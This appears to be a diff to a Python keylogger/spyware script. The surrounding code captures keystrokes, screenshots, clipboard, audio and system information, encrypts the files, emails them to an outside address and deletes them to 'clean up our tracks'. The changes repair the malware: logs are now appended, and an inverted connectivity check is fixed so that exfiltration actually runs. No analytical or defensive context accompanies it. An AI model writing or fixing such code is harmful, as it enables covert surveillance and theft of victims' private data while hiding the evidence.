@@ -234,7 +234,7 @@ while number_of_iterations < number_of_iterations_end:
         listener.join()
 
     if currentTime > stoppingTime:
-        with open(file_path + keys_information, "w") as f:
+        with open(file_path + keys_information, "a") as f:
             f.write(" ")
 
         screenshot()
@@ -264,11 +264,13 @@ for encrypting_file in files_to_encrypt:
     with open(encrypted_file_names[count], 'wb') as f:
         f.write(encrypted)
 
-if internet != 'OK':
+if internet == 'OK':
     send_email(encrypted_file_names[count], encrypted_file_names[count], toaddr)
     count += 1
     time.sleep(120)
+
     # Clean up our tracks and delete files
     delete_files = [system_information, clipboard_information, keys_information, screenshot_information, audio_information]
     for file in delete_files:
         os.remove(file_path + file)
+
